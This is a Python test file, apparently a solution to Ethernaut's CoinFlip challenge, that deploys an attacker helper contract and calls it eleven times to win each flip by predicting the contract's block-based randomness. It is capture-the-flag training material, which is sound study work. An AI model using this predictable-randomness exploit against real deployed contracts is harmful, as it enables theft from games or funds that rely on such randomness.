from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv03_coinflip import CoinFlip
from pytypes.contracts.attacker.lv03_coinflip_solver import CoinFlipSolver

@default_chain.connect()
def test_level_03():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv03()
    exploit_level_03(contract)
    ethernaut.check_lv03(contract)

def exploit_level_03(contract: CoinFlip):
    # Problem: any calculations can be done by deployed helper contract, which than calls the original contract
    solver = CoinFlipSolver.deploy()

    for i in range(11):
        tx = solver.solveFlip(contract.address)
        side, result = tx.return_value
        assert True == result
        print(f"In block#{tx.block_number} you guessed {side} and you were right!")
